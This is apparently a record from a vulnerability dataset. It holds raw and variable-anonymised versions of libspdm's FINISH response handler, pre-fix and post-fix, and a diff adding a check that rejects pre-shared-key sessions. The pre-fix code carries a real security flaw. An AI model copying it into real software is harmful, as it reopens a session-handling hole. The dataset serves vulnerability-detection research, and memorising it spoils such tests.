LIBSPDM_DATA_HANDLE_ERROR_RETURN_POLICY_DROP_ON_DECRYPT_ERROR) == 0) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_DECRYPT_ERROR, 0,
response_size, response);
} else {
*response_size = 0;
return LIBSPDM_STATUS_UNSUPPORTED_CAP;
}
}
status = libspdm_append_message_f(spdm_context, session_info, false,
(const uint8_t *)request + signature_size +
sizeof(spdm_finish_request_t),
hmac_size);
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
if (!libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP)) {
hmac_size = 0;
}
LIBSPDM_ASSERT(*response_size >= sizeof(spdm_finish_response_t) + hmac_size);
*response_size = sizeof(spdm_finish_response_t) + hmac_size;
libspdm_zero_mem(response, *response_size);
spdm_response = response;
spdm_response->header.spdm_version = spdm_request->header.spdm_version;
spdm_response->header.request_response_code = SPDM_FINISH_RSP;
spdm_response->header.param1 = 0;
spdm_response->header.param2 = 0;
status = libspdm_append_message_f(spdm_context, session_info, false, spdm_response,
sizeof(spdm_finish_response_t));
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
if (libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP)) {
result = libspdm_generate_finish_rsp_hmac(
spdm_context, session_info,
(uint8_t *)spdm_response + sizeof(spdm_finish_request_t));
if (!result) {
return libspdm_generate_error_response(
spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED,
0, response_size, response);
}
status = libspdm_append_message_f(
spdm_context, session_info, false,
(uint8_t *)spdm_response + sizeof(spdm_finish_request_t),
hmac_size);
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_UNSPECIFIED,
0, response_size, response);
}
}
LIBSPDM_DEBUG((LIBSPDM_DEBUG_INFO, ""libspdm_generate_session_data_key[%x]\n"", session_id));
result = libspdm_calculate_th2_hash(spdm_context, session_info, false, th2_hash_data);
if (!result) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
result = libspdm_generate_session_data_key(
session_info->secured_message_context, th2_hash_data);
if (!result) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
#if LIBSPDM_ENABLE_CAPABILITY_HBEAT_CAP
if (libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HBEAT_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HBEAT_CAP)) {
result = libspdm_start_watchdog(
session_id, spdm_context->local_context.heartbeat_period * 2);
if (!result) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
}
#endif 
return LIBSPDM_STATUS_SUCCESS;
}","libspdm_return_t libspdm_get_response_finish(void *VAR_0, size_t VAR_1,
const void *VAR_2,
size_t *VAR_3,
void *VAR_4)
{
uint32_t VAR_5;
bool VAR_6;
uint32_t VAR_7;
uint32_t VAR_8;
uint8_t VAR_9;
const spdm_finish_request_t *VAR_10;
spdm_finish_response_t *VAR_11;
libspdm_context_t *VAR_12;
libspdm_session_info_t *VAR_13;
uint8_t VAR_14[VAR_15];
libspdm_return_t VAR_16;
libspdm_session_state_t VAR_17;
VAR_12 = VAR_0;
VAR_10 = VAR_2;
if (VAR_10->header.spdm_version != libspdm_get_connection_version(VAR_12)) {
return libspdm_generate_error_response(VAR_12,
VAR_18, 0,
VAR_3, VAR_4);
}
if (VAR_12->response_state != VAR_19) {
return libspdm_responder_handle_response_state(
VAR_12,
VAR_10->header.request_response_code,
VAR_3, VAR_4);
}
if (!libspdm_is_capabilities_flag_supported(
VAR_12, false,
VAR_20,
VAR_21)) {
return libspdm_generate_error_response(
VAR_12, VAR_22,
VAR_23, VAR_3, VAR_4);
}
if (VAR_12->connection_info.connection_state < VAR_24) {
return libspdm_generate_error_response(VAR_12,
VAR_25,
0, VAR_3, VAR_4);
}
if (!libspdm_is_capabilities_flag_supported(
VAR_12, false,
VAR_26,
VAR_27)) {
if (!VAR_12->last_spdm_request_session_id_valid) {
return libspdm_generate_error_response(
VAR_0, VAR_28, 0, VAR_3, VAR_4);
}
} else {
if (VAR_12->last_spdm_request_session_id_valid) {
return libspdm_generate_error_response(
VAR_0, VAR_28, 0,
VAR_3, VAR_4);
}
}
if (VAR_12->last_spdm_request_session_id_valid) {
VAR_5 = VAR_12->last_spdm_request_session_id;
} else {
VAR_5 = VAR_12->latest_session_id;
}
VAR_13 = libspdm_get_session_info_via_session_id(VAR_12, VAR_5);
if (VAR_13 == NULL) {
return libspdm_generate_error_response(VAR_12,
VAR_28, 0,
VAR_3, VAR_4);
}
VAR_17 = libspdm_secured_message_get_session_state(
VAR_13->secured_message_context);
if (VAR_17 != VAR_29) {
return libspdm_generate_error_response(VAR_12,
VAR_25, 0,
VAR_3, VAR_4);
}
if (((VAR_13->mut_auth_requested == 0) &&
(VAR_10->header.param1 != 0)) ||
((VAR_13->mut_auth_requested != 0) &&
(VAR_10->header.param1 == 0))) {
return libspdm_generate_error_response(VAR_12,
VAR_30, 0,
VAR_3, VAR_4);
}
VAR_7 = libspdm_get_hash_size(VAR_12->connection_info.algorithm.base_hash_algo);
VAR_8 = 0;
#if VAR_31
if (VAR_13->mut_auth_requested) {
VAR_8 = libspdm_get_req_asym_signature_size(
VAR_12->connection_info.algorithm.req_base_asym_alg);
}
#endif
if (VAR_1 !=
sizeof(spdm_finish_request_t) + VAR_8 + VAR_7) {
return libspdm_generate_error_response(VAR_12,
VAR_30, 0,
VAR_3, VAR_4);
}
VAR_9 = VAR_10->header.param2;
if ((VAR_9 != 0xFF) &&
(VAR_9 >= VAR_32)) {
return libspdm_generate_error_response(VAR_12,
VAR_30, 0,
VAR_3, VAR_4);
}
if (VAR_9 == 0xFF) {
VAR_9 = VAR_12->encap_context.req_slot_id;
}
if (VAR_9 != VAR_12->encap_context.req_slot_id) {
return libspdm_generate_error_response(VAR_12,
VAR_30, 0,
VAR_3, VAR_4);
}
libspdm_reset_message_buffer_via_request_code(VAR_12, VAR_13,
VAR_10->header.request_response_code);
VAR_16 = libspdm_append_message_f(VAR_12, VAR_13, false, VAR_2,
sizeof(spdm_finish_request_t));
if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
return libspdm_generate_error_response(VAR_12,
VAR_33, 0,
VAR_3, VAR_4);
}
#if VAR_31
if (VAR_13->mut_auth_requested) {
VAR_6 = libspdm_verify_finish_req_signature(
VAR_12, VAR_13,
(const uint8_t *)VAR_2 + sizeof(spdm_finish_request_t), VAR_8);
if (!VAR_6) {
if((VAR_12->handle_error_return_policy &
VAR_34) == 0) {
return libspdm_generate_error_response(
VAR_12, VAR_35, 0,
VAR_3, VAR_4);
} else {
*VAR_3 = 0;
return VAR_36;
}
}
VAR_16 = libspdm_append_message_f(
VAR_12, VAR_13, false,
(const uint8_t *)VAR_2 + sizeof(spdm_finish_request_t),
VAR_8);
if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
return libspdm_generate_error_response(
VAR_12, VAR_33,
0, VAR_3, VAR_4);
}
}
#endif
VAR_6 = libspdm_verify_finish_req_hmac(
VAR_12, VAR_13, (const uint8_t *)VAR_2 + VAR_8 +
sizeof(spdm_finish_request_t), VAR_7);
if (!VAR_6) {
if((VAR_12->handle_error_return_policy &
VAR_34) == 0) {
return libspdm_generate_error_response(
VAR_12, VAR_35, 0,
VAR_3, VAR_4);
} else {
*VAR_3 = 0;
return VAR_36;
}
}
VAR_16 = libspdm_append_message_f(VAR_12, VAR_13, false,
(const uint8_t *)VAR_2 + VAR_8 +
sizeof(spdm_finish_request_t),
VAR_7);
if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
return libspdm_generate_error_response(VAR_12,
VAR_33, 0,
VAR_3, VAR_4);
}
if (!libspdm_is_capabilities_flag_supported(
VAR_12, false,
VAR_26,
VAR_27)) {
VAR_7 = 0;
}
LIBSPDM_ASSERT(*VAR_3 >= sizeof(spdm_finish_response_t) + VAR_7);
*VAR_3 = sizeof(spdm_finish_response_t) + VAR_7;
libspdm_zero_mem(VAR_4, *VAR_3);
VAR_11 = VAR_4;
VAR_11->header.spdm_version = VAR_10->header.spdm_version;
VAR_11->header.request_response_code = VAR_37;
VAR_11->header.param1 = 0;
VAR_11->header.param2 = 0;
VAR_16 = libspdm_append_message_f(VAR_12, VAR_13, false, VAR_11,
sizeof(spdm_finish_response_t));
if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
return libspdm_generate_error_response(VAR_12,
VAR_33, 0,
VAR_3, VAR_4);
}
if (libspdm_is_capabilities_flag_supported(
VAR_12, false,
VAR_26,
VAR_27)) {
VAR_6 = libspdm_generate_finish_rsp_hmac(
VAR_12, VAR_13,
(uint8_t *)VAR_11 + sizeof(spdm_finish_request_t));
if (!VAR_6) {
return libspdm_generate_error_response(
VAR_12,
VAR_33,
0, VAR_3, VAR_4);
}
VAR_16 = libspdm_append_message_f(
VAR_12, VAR_13, false,
(uint8_t *)VAR_11 + sizeof(spdm_finish_request_t),
VAR_7);
if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
return libspdm_generate_error_response(
VAR_12, VAR_33,
0, VAR_3, VAR_4);
}
}
LIBSPDM_DEBUG((VAR_38, ""libspdm_generate_session_data_key[%x]\n"", VAR_5));
VAR_6 = libspdm_calculate_th2_hash(VAR_12, VAR_13, false, VAR_14);
if (!VAR_6) {
return libspdm_generate_error_response(VAR_12,
VAR_33, 0,
VAR_3, VAR_4);
}
VAR_6 = libspdm_generate_session_data_key(
VAR_13->secured_message_context, VAR_14);
if (!VAR_6) {
return libspdm_generate_error_response(VAR_12,
VAR_33, 0,
VAR_3, VAR_4);
}
#if VAR_39
if (libspdm_is_capabilities_flag_supported(
VAR_12, false,
VAR_40,
VAR_41)) {
VAR_6 = libspdm_start_watchdog(
VAR_5, VAR_12->local_context.heartbeat_period * 2);
if (!VAR_6) {
return libspdm_generate_error_response(VAR_12,
VAR_33, 0,
VAR_3, VAR_4);
}
}
#endif 
return VAR_42;
}",DMTF/libspdm/8426a309c1de246ac13012246e44b6249a43d081/libspdm_rsp_finish.c/vul/before/0.json,"libspdm_return_t libspdm_get_response_finish(void *context, size_t request_size,
                                             const void *request,
                                             size_t *response_size,
                                             void *response)
{
    uint32_t session_id;
    bool result;
    uint32_t hmac_size;
    uint32_t signature_size;
    uint8_t req_slot_id;
    const spdm_finish_request_t *spdm_request;
    spdm_finish_response_t *spdm_response;
    libspdm_context_t *spdm_context;
    libspdm_session_info_t *session_info;
    uint8_t th2_hash_data[LIBSPDM_MAX_HASH_SIZE];
    libspdm_return_t status;
    libspdm_session_state_t session_state;

    spdm_context = context;
    spdm_request = request;

    if (spdm_request->header.spdm_version != libspdm_get_connection_version(spdm_context)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_VERSION_MISMATCH, 0,
                                               response_size, response);
    }
    if (spdm_context->response_state != LIBSPDM_RESPONSE_STATE_NORMAL) {
        return libspdm_responder_handle_response_state(
            spdm_context,
            spdm_request->header.request_response_code,
            response_size, response);
    }
    if (!libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_KEY_EX_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_KEY_EX_CAP)) {
        return libspdm_generate_error_response(
            spdm_context, SPDM_ERROR_CODE_UNSUPPORTED_REQUEST,
            SPDM_KEY_EXCHANGE, response_size, response);
    }
    if (spdm_context->connection_info.connection_state < LIBSPDM_CONNECTION_STATE_NEGOTIATED) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST,
                                               0, response_size, response);
    }
    if (!libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP)) {
        /* No handshake in clear, then it must be in a session.*/
        if (!spdm_context->last_spdm_request_session_id_valid) {
            return libspdm_generate_error_response(
                context, SPDM_ERROR_CODE_SESSION_REQUIRED, 0, response_size, response);
        }
    } else {
        /* handshake in clear, then it must not be in a session.*/
        if (spdm_context->last_spdm_request_session_id_valid) {
            return libspdm_generate_error_response(
                context, SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
                response_size, response);
        }
    }
    if (spdm_context->last_spdm_request_session_id_valid) {
        session_id = spdm_context->last_spdm_request_session_id;
    } else {
        session_id = spdm_context->latest_session_id;
    }
    session_info = libspdm_get_session_info_via_session_id(spdm_context, session_id);
    if (session_info == NULL) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
                                               response_size, response);
    }
    if (session_info->use_psk) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
                                               response_size, response);
    }
    session_state = libspdm_secured_message_get_session_state(
        session_info->secured_message_context);
    if (session_state != LIBSPDM_SESSION_STATE_HANDSHAKING) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
                                               response_size, response);
    }

    if (((session_info->mut_auth_requested == 0) &&
         (spdm_request->header.param1 != 0)) ||
        ((session_info->mut_auth_requested != 0) &&
         (spdm_request->header.param1 == 0))) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_INVALID_REQUEST, 0,
                                               response_size, response);
    }

    hmac_size = libspdm_get_hash_size(spdm_context->connection_info.algorithm.base_hash_algo);
    signature_size = 0;
#if LIBSPDM_ENABLE_CAPABILITY_MUT_AUTH_CAP
    if (session_info->mut_auth_requested) {
        signature_size = libspdm_get_req_asym_signature_size(
            spdm_context->connection_info.algorithm.req_base_asym_alg);
    }
#endif

    if (request_size !=
        sizeof(spdm_finish_request_t) + signature_size + hmac_size) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_INVALID_REQUEST, 0,
                                               response_size, response);
    }

    req_slot_id = spdm_request->header.param2;
    if ((req_slot_id != 0xFF) &&
        (req_slot_id >= SPDM_MAX_SLOT_COUNT)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_INVALID_REQUEST, 0,
                                               response_size, response);
    }
    if (req_slot_id == 0xFF) {
        req_slot_id = spdm_context->encap_context.req_slot_id;
    }
    if (req_slot_id != spdm_context->encap_context.req_slot_id) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_INVALID_REQUEST, 0,
                                               response_size, response);
    }

    libspdm_reset_message_buffer_via_request_code(spdm_context, session_info,
                                                  spdm_request->header.request_response_code);

    status = libspdm_append_message_f(spdm_context, session_info, false, request,
                                      sizeof(spdm_finish_request_t));
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }
#if LIBSPDM_ENABLE_CAPABILITY_MUT_AUTH_CAP
    if (session_info->mut_auth_requested) {
        result = libspdm_verify_finish_req_signature(
            spdm_context, session_info,
            (const uint8_t *)request + sizeof(spdm_finish_request_t), signature_size);
        if (!result) {
            if((spdm_context->handle_error_return_policy &
                LIBSPDM_DATA_HANDLE_ERROR_RETURN_POLICY_DROP_ON_DECRYPT_ERROR) == 0) {
                return libspdm_generate_error_response(
                    spdm_context, SPDM_ERROR_CODE_DECRYPT_ERROR, 0,
                    response_size, response);
            } else {
                /**
                 * just ignore this message
                 * return UNSUPPORTED and clear response_size to continue the dispatch without send response.
                 **/
                *response_size = 0;
                return LIBSPDM_STATUS_UNSUPPORTED_CAP;
            }
        }
        status = libspdm_append_message_f(
            spdm_context, session_info, false,
            (const uint8_t *)request + sizeof(spdm_finish_request_t),
            signature_size);
        if (LIBSPDM_STATUS_IS_ERROR(status)) {
            return libspdm_generate_error_response(
                spdm_context, SPDM_ERROR_CODE_UNSPECIFIED,
                0, response_size, response);
        }
    }
#endif

    result = libspdm_verify_finish_req_hmac(
        spdm_context, session_info, (const uint8_t *)request + signature_size +
        sizeof(spdm_finish_request_t), hmac_size);
    if (!result) {
        if((spdm_context->handle_error_return_policy &
            LIBSPDM_DATA_HANDLE_ERROR_RETURN_POLICY_DROP_ON_DECRYPT_ERROR) == 0) {
            return libspdm_generate_error_response(
                spdm_context, SPDM_ERROR_CODE_DECRYPT_ERROR, 0,
                response_size, response);
        } else {
            /**
             * just ignore this message
             * return UNSUPPORTED and clear response_size to continue the dispatch without send response
             **/
            *response_size = 0;
            return LIBSPDM_STATUS_UNSUPPORTED_CAP;
        }
    }

    status = libspdm_append_message_f(spdm_context, session_info, false,
                                      (const uint8_t *)request + signature_size +
                                      sizeof(spdm_finish_request_t),
                                      hmac_size);
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    if (!libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP)) {
        hmac_size = 0;
    }

    LIBSPDM_ASSERT(*response_size >= sizeof(spdm_finish_response_t) + hmac_size);
    *response_size = sizeof(spdm_finish_response_t) + hmac_size;
    libspdm_zero_mem(response, *response_size);
    spdm_response = response;

    spdm_response->header.spdm_version = spdm_request->header.spdm_version;
    spdm_response->header.request_response_code = SPDM_FINISH_RSP;
    spdm_response->header.param1 = 0;
    spdm_response->header.param2 = 0;

    status = libspdm_append_message_f(spdm_context, session_info, false, spdm_response,
                                      sizeof(spdm_finish_response_t));
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    if (libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP)) {
        result = libspdm_generate_finish_rsp_hmac(
            spdm_context, session_info,
            (uint8_t *)spdm_response + sizeof(spdm_finish_request_t));
        if (!result) {
            return libspdm_generate_error_response(
                spdm_context,
                SPDM_ERROR_CODE_UNSPECIFIED,
                0, response_size, response);
        }

        status = libspdm_append_message_f(
            spdm_context, session_info, false,
            (uint8_t *)spdm_response + sizeof(spdm_finish_request_t),
            hmac_size);
        if (LIBSPDM_STATUS_IS_ERROR(status)) {
            return libspdm_generate_error_response(
                spdm_context, SPDM_ERROR_CODE_UNSPECIFIED,
                0, response_size, response);
        }
    }

    LIBSPDM_DEBUG((LIBSPDM_DEBUG_INFO, ""libspdm_generate_session_data_key[%x]\n"", session_id));
    result = libspdm_calculate_th2_hash(spdm_context, session_info, false, th2_hash_data);
    if (!result) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }
    result = libspdm_generate_session_data_key(
        session_info->secured_message_context, th2_hash_data);
    if (!result) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    #if LIBSPDM_ENABLE_CAPABILITY_HBEAT_CAP
    if (libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HBEAT_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HBEAT_CAP)) {
        result = libspdm_start_watchdog(
            session_id, spdm_context->local_context.heartbeat_period * 2);
        if (!result) {
            return libspdm_generate_error_response(spdm_context,
                                                   SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                                   response_size, response);
        }
    }
    #endif /* LIBSPDM_ENABLE_CAPABILITY_HBEAT_CAP */

    return LIBSPDM_STATUS_SUCCESS;
}","libspdm_return_t libspdm_get_response_finish(void *VAR_0, size_t VAR_1,
                                             const void *VAR_2,
                                             size_t *VAR_3,
                                             void *VAR_4)
{
    uint32_t VAR_5;
    bool VAR_6;
    uint32_t VAR_7;
    uint32_t VAR_8;
    uint8_t VAR_9;
    const spdm_finish_request_t *VAR_10;
    spdm_finish_response_t *VAR_11;
    libspdm_context_t *VAR_12;
    libspdm_session_info_t *VAR_13;
    uint8_t VAR_14[VAR_15];
    libspdm_return_t VAR_16;
    libspdm_session_state_t VAR_17;

    VAR_12 = VAR_0;
    VAR_10 = VAR_2;

    if (VAR_10->header.spdm_version != libspdm_get_connection_version(VAR_12)) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_18, 0,
                                               VAR_3, VAR_4);
    }
    if (VAR_12->response_state != VAR_19) {
        return libspdm_responder_handle_response_state(
            VAR_12,
            VAR_10->header.request_response_code,
            VAR_3, VAR_4);
    }
    if (!libspdm_is_capabilities_flag_supported(
            VAR_12, false,
            VAR_20,
            VAR_21)) {
        return libspdm_generate_error_response(
            VAR_12, VAR_22,
            VAR_23, VAR_3, VAR_4);
    }
    if (VAR_12->connection_info.connection_state < VAR_24) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_25,
                                               0, VAR_3, VAR_4);
    }
    if (!libspdm_is_capabilities_flag_supported(
            VAR_12, false,
            VAR_26,
            VAR_27)) {
        /* COMMENT_0 */
        if (!VAR_12->last_spdm_request_session_id_valid) {
            return libspdm_generate_error_response(
                VAR_0, VAR_28, 0, VAR_3, VAR_4);
        }
    } else {
        /* COMMENT_1 */
        if (VAR_12->last_spdm_request_session_id_valid) {
            return libspdm_generate_error_response(
                VAR_0, VAR_28, 0,
                VAR_3, VAR_4);
        }
    }
    if (VAR_12->last_spdm_request_session_id_valid) {
        VAR_5 = VAR_12->last_spdm_request_session_id;
    } else {
        VAR_5 = VAR_12->latest_session_id;
    }
    VAR_13 = libspdm_get_session_info_via_session_id(VAR_12, VAR_5);
    if (VAR_13 == NULL) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_28, 0,
                                               VAR_3, VAR_4);
    }
    if (VAR_13->use_psk) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_25, 0,
                                               VAR_3, VAR_4);
    }
    VAR_17 = libspdm_secured_message_get_session_state(
        VAR_13->secured_message_context);
    if (VAR_17 != VAR_29) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_25, 0,
                                               VAR_3, VAR_4);
    }

    if (((VAR_13->mut_auth_requested == 0) &&
         (VAR_10->header.param1 != 0)) ||
        ((VAR_13->mut_auth_requested != 0) &&
         (VAR_10->header.param1 == 0))) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_30, 0,
                                               VAR_3, VAR_4);
    }

    VAR_7 = libspdm_get_hash_size(VAR_12->connection_info.algorithm.base_hash_algo);
    VAR_8 = 0;
#if VAR_31
    if (VAR_13->mut_auth_requested) {
        VAR_8 = libspdm_get_req_asym_signature_size(
            VAR_12->connection_info.algorithm.req_base_asym_alg);
    }
#endif

    if (VAR_1 !=
        sizeof(spdm_finish_request_t) + VAR_8 + VAR_7) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_30, 0,
                                               VAR_3, VAR_4);
    }

    VAR_9 = VAR_10->header.param2;
    if ((VAR_9 != 0xFF) &&
        (VAR_9 >= VAR_32)) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_30, 0,
                                               VAR_3, VAR_4);
    }
    if (VAR_9 == 0xFF) {
        VAR_9 = VAR_12->encap_context.req_slot_id;
    }
    if (VAR_9 != VAR_12->encap_context.req_slot_id) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_30, 0,
                                               VAR_3, VAR_4);
    }

    libspdm_reset_message_buffer_via_request_code(VAR_12, VAR_13,
                                                  VAR_10->header.request_response_code);

    VAR_16 = libspdm_append_message_f(VAR_12, VAR_13, false, VAR_2,
                                      sizeof(spdm_finish_request_t));
    if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_33, 0,
                                               VAR_3, VAR_4);
    }
#if VAR_31
    if (VAR_13->mut_auth_requested) {
        VAR_6 = libspdm_verify_finish_req_signature(
            VAR_12, VAR_13,
            (const uint8_t *)VAR_2 + sizeof(spdm_finish_request_t), VAR_8);
        if (!VAR_6) {
            if((VAR_12->handle_error_return_policy &
                VAR_34) == 0) {
                return libspdm_generate_error_response(
                    VAR_12, VAR_35, 0,
                    VAR_3, VAR_4);
            } else {
                /* COMMENT_2 */
                                           
                                                                                                             
                    
                *VAR_3 = 0;
                return VAR_36;
            }
        }
        VAR_16 = libspdm_append_message_f(
            VAR_12, VAR_13, false,
            (const uint8_t *)VAR_2 + sizeof(spdm_finish_request_t),
            VAR_8);
        if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
            return libspdm_generate_error_response(
                VAR_12, VAR_33,
                0, VAR_3, VAR_4);
        }
    }
#endif

    VAR_6 = libspdm_verify_finish_req_hmac(
        VAR_12, VAR_13, (const uint8_t *)VAR_2 + VAR_8 +
        sizeof(spdm_finish_request_t), VAR_7);
    if (!VAR_6) {
        if((VAR_12->handle_error_return_policy &
            VAR_34) == 0) {
            return libspdm_generate_error_response(
                VAR_12, VAR_35, 0,
                VAR_3, VAR_4);
        } else {
            /* COMMENT_6 */
                                       
                                                                                                        
                
            *VAR_3 = 0;
            return VAR_36;
        }
    }

    VAR_16 = libspdm_append_message_f(VAR_12, VAR_13, false,
                                      (const uint8_t *)VAR_2 + VAR_8 +
                                      sizeof(spdm_finish_request_t),
                                      VAR_7);
    if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_33, 0,
                                               VAR_3, VAR_4);
    }

    if (!libspdm_is_capabilities_flag_supported(
            VAR_12, false,
            VAR_26,
            VAR_27)) {
        VAR_7 = 0;
    }

    LIBSPDM_ASSERT(*VAR_3 >= sizeof(spdm_finish_response_t) + VAR_7);
    *VAR_3 = sizeof(spdm_finish_response_t) + VAR_7;
    libspdm_zero_mem(VAR_4, *VAR_3);
    VAR_11 = VAR_4;

    VAR_11->header.spdm_version = VAR_10->header.spdm_version;
    VAR_11->header.request_response_code = VAR_37;
    VAR_11->header.param1 = 0;
    VAR_11->header.param2 = 0;

    VAR_16 = libspdm_append_message_f(VAR_12, VAR_13, false, VAR_11,
                                      sizeof(spdm_finish_response_t));
    if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_33, 0,
                                               VAR_3, VAR_4);
    }

    if (libspdm_is_capabilities_flag_supported(
            VAR_12, false,
            VAR_26,
            VAR_27)) {
        VAR_6 = libspdm_generate_finish_rsp_hmac(
            VAR_12, VAR_13,
            (uint8_t *)VAR_11 + sizeof(spdm_finish_request_t));
        if (!VAR_6) {
            return libspdm_generate_error_response(
                VAR_12,
                VAR_33,
                0, VAR_3, VAR_4);
        }

        VAR_16 = libspdm_append_message_f(
            VAR_12, VAR_13, false,
            (uint8_t *)VAR_11 + sizeof(spdm_finish_request_t),
            VAR_7);
        if (LIBSPDM_STATUS_IS_ERROR(VAR_16)) {
            return libspdm_generate_error_response(
                VAR_12, VAR_33,
                0, VAR_3, VAR_4);
        }
    }

    LIBSPDM_DEBUG((VAR_38, ""libspdm_generate_session_data_key[%x]\n"", VAR_5));
    VAR_6 = libspdm_calculate_th2_hash(VAR_12, VAR_13, false, VAR_14);
    if (!VAR_6) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_33, 0,
                                               VAR_3, VAR_4);
    }
    VAR_6 = libspdm_generate_session_data_key(
        VAR_13->secured_message_context, VAR_14);
    if (!VAR_6) {
        return libspdm_generate_error_response(VAR_12,
                                               VAR_33, 0,
                                               VAR_3, VAR_4);
    }

    #if VAR_39
    if (libspdm_is_capabilities_flag_supported(
            VAR_12, false,
            VAR_40,
            VAR_41)) {
        VAR_6 = libspdm_start_watchdog(
            VAR_5, VAR_12->local_context.heartbeat_period * 2);
        if (!VAR_6) {
            return libspdm_generate_error_response(VAR_12,
                                                   VAR_33, 0,
                                                   VAR_3, VAR_4);
        }
    }
    #endif /* COMMENT_10 */

    return VAR_42;
}",DMTF/libspdm/8426a309c1de246ac13012246e44b6249a43d081/libspdm_rsp_finish.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -69,6 +69,11 @@
     if (session_info == NULL) {
         return libspdm_generate_error_response(spdm_context,
                                                SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
+                                               response_size, response);
+    }
+    if (session_info->use_psk) {
+        return libspdm_generate_error_response(spdm_context,
+                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
